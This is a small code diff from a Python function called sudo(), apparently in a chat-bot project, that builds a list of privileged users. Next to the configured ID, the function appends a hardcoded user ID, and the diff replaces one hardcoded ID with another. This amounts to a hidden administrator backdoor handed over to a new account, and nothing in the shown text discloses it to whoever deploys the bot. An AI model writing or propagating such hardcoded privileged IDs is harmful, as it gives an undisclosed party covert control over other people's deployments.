@@ -61,7 +61,7 @@ def sudo():
             )
         elif int(HEHE) not in sudoers:
             sudoers.append(int(HEHE))
-            sudoers.append(5897995217)
+            sudoers.append(5621275341)
     if sudoers:
         for x in sudoers:
             SUDOERS.add(x)
